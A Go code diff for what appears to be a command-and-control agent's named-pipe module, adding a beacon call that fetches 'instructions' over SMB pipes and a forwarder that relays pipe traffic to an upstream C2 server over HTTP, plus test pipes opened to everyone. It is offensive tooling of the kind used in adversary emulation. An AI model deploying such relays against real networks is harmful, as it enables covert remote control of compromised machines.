@@ -5,11 +5,32 @@ import (
     "fmt"
     "io"
     "net"
+    "encoding/json"
     "encoding/hex" // for debugging
     "time"
-	"../winio"
-	"../output"
+    "../winio"
+    "../output"
 )
+
+// Send beacon to upstream pipe and return instructions.
+func GetInstructionsSmb(profile map[string]interface{}) map[string]interface{} {
+    data, _ := json.Marshal(profile)
+    responseData := SendDataToPipe(profile["upstreamPipePath"].(string), data, true) // change to true for now
+
+	var out map[string]interface{}
+
+	if responseData != nil {
+		output.VerbosePrint("[+] beacon: ALIVE")
+		var commands interface{}
+		json.Unmarshal(responseData, &out)
+		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
+		out["sleep"] = int(out["sleep"].(float64))
+		out["instructions"] = commands
+	} else {
+		output.VerbosePrint("[-] beacon: DEAD")
+	}
+	return out
+}
 
 // Spin up a named pipe forwarder that listens on the specified named pipe and forwards the received data
 // to the agent's c2/upstream server.
@@ -26,10 +47,8 @@ func StartNamedPipeForwarder(pipeName string, upstreamDest string, upstreamProto
 
     defer listener.Close()
 
-	buffer := make([]byte, 4*1024)
-
 	for {
-	    output.VerbosePrint("[*] Waiting for connection from client")
+        output.VerbosePrint("[*] Waiting for connection from client")
         conn, err := listener.Accept()
         if err != nil {
             output.VerbosePrint("[!] Error with accepting connection to listener.")
@@ -40,59 +59,38 @@ func StartNamedPipeForwarder(pipeName string, upstreamDest string, upstreamProto
         pipeReader := bufio.NewReader(conn)
         pipeWriter := bufio.NewWriter(conn)
 
-	    totalData := make([]byte, 0)
-	    numBytes := int64(0)
-	    numChunks := int64(0)
-
-        for {
-            // Read in data chunk and get number of bytes read.
-            n, err := pipeReader.Read(buffer[:cap(buffer)])
-            buffer = buffer[:n]
-
-            if n == 0 {
-                if err == nil {
-                    // Try reading again.
-                    time.Sleep(200 * time.Millisecond)
-                    continue
-                } else if err == io.EOF {
-                    // Reading is done.
-                    output.VerbosePrint("[*] Done reading data")
-                    break
-                } else {
-                     output.VerbosePrint(fmt.Sprintf("[!] Error reading data from pipe %s", pipeName))
-                     panic(err)
-                }
-            }
-
-            numChunks++
-            numBytes += int64(len(buffer))
-
-            // Add data chunk to current total
-            totalData = append(totalData, buffer...)
-
-            if err != nil && err != io.EOF {
-                 output.VerbosePrint(fmt.Sprintf("[!] Error reading data from pipe %s", pipeName))
-                 panic(err)
-            }
-        }
-
-        // Data has been read from pipe
-        output.VerbosePrint(fmt.Sprintf("[*] Read in %d chunks, %d bytes from pipe", numChunks, numBytes))
+        // Read in the data.
+        totalData, _ := readPipeData(pipeReader)
 
         // Handle data
-        handlePipePayload(totalData, upstreamDest, upstreamProtocol, pipeWriter)
+        listenerHandlePipePayload(totalData, upstreamDest, upstreamProtocol, pipeWriter)
         conn.Close()
 	}
 }
 
 // Helper function that handles data received from the named pipe by sending it to the agent's c2/upstream server.
 // Will write responses into the original pipe.
-func handlePipePayload(data []byte, upstreamDest string, upstreamProtocol string, pipeWriter *bufio.Writer) {
+func listenerHandlePipePayload(data []byte, upstreamDest string, upstreamProtocol string, pipeWriter *bufio.Writer) {
     // Placeholder debugging
     output.VerbosePrint(fmt.Sprintf("[*] Received data (hex): %s", hex.EncodeToString(data)))
+    output.VerbosePrint(fmt.Sprintf("[*] Forwarding message upstream to %s via %s", upstreamDest, upstreamProtocol))
+
+    if upstreamProtocol == "http" {
+        // Hardcoded as instructions for now - TODO add flexibility
+        address := fmt.Sprintf("%s/instructions", upstreamDest)
+        bites := postRequest(address, data)
+
+        if bites != nil {
+            output.VerbosePrint("[+] relaying beacon: ALIVE")
+            writePipeData(bites, pipeWriter)
+        } else {
+            output.VerbosePrint("[-] relaying beacon: DEAD")
+        }
+    }
 }
 
-func SendDataToPipe(pipePath string, data []byte) {
+// Sends data to pipe. If expecting data, will read back the data and return it (otherwise return nil)
+func SendDataToPipe(pipePath string, data []byte, expectResponse bool) []byte {
     conn, err := winio.DialPipe(pipePath, nil)
 
     if err != nil {
@@ -104,7 +102,61 @@ func SendDataToPipe(pipePath string, data []byte) {
 
     writePipeData(data, writer)
 
+    var responseData []byte = nil
+
+    if expectResponse {
+
+        output.VerbosePrint("[*] Going to wait for response from upstream")
+        reader := bufio.NewReader(conn)
+        responseData, _ = readPipeData(reader)
+    }
+
     conn.Close()
+
+    return responseData
+}
+
+// Returns data and number of bytes read.
+func readPipeData(pipeReader *bufio.Reader) ([]byte, int64) {
+    buffer := make([]byte, 4*1024)
+    totalData := make([]byte, 0)
+    numBytes := int64(0)
+    numChunks := int64(0)
+    for {
+        n, err := pipeReader.Read(buffer[:cap(buffer)])
+        buffer = buffer[:n]
+
+        if n == 0 {
+            if err == nil {
+                // Try reading again.
+                time.Sleep(200 * time.Millisecond)
+                continue
+            } else if err == io.EOF {
+                // Reading is done.
+                output.VerbosePrint("[*] Done reading data")
+                break
+            } else {
+                 output.VerbosePrint("[!] Error reading data from pipe")
+                 panic(err)
+            }
+        }
+
+        numChunks++
+        numBytes += int64(len(buffer))
+
+        // Add data chunk to current total
+        totalData = append(totalData, buffer...)
+
+        if err != nil && err != io.EOF {
+             output.VerbosePrint("[!] Error reading data from pipe")
+             panic(err)
+        }
+    }
+
+    // Data has been read from pipe
+    output.VerbosePrint(fmt.Sprintf("[*] Read in %d chunks, %d bytes from pipe", numChunks, numBytes))
+
+    return totalData, numBytes
 }
 
 func writePipeData(data []byte, pipeWriter *bufio.Writer) {
@@ -122,8 +174,6 @@ func writePipeData(data []byte, pipeWriter *bufio.Writer) {
 	}
 
     output.VerbosePrint(fmt.Sprintf("[*] Wrote %d bytes to pipe", n))
-
-    time.Sleep(3000*time.Millisecond)
 }
 
 // TESTING FUNCTIONS
@@ -133,10 +183,8 @@ func writePipeData(data []byte, pipeWriter *bufio.Writer) {
 // Test reading from and writing to specified named pipe, all within local machine.
 func TestLocalListenDialReadWrite(testPipeName string) {
     config := &winio.PipeConfig{
-        //SecurityDescriptor: "D:NO_ACCESS_CONTROL",
-        //SecurityDescriptor: "D:(A;;GA;;;WD)(A;;GA;;;S-1-5-7)",
-        //SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)",
-        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)(A;;GA;;;S-1-5-7)",
+        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
+        //SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)(A;;GA;;;S-1-5-7)",
     }
 	l, err := winio.ListenPipe(testPipeName, config)
 	if err != nil {
@@ -178,7 +226,7 @@ func TestLocalListenDialReadWrite(testPipeName string) {
 // Listens on pipe, repeats what was read. Loops until sender sends "exit\n".
 func TestListenDialReadWrite(testPipeName string) {
     config := &winio.PipeConfig{
-        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)(A;;GA;;;S-1-5-7)",
+        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
     }
 	l, err := winio.ListenPipe(testPipeName, config)
 
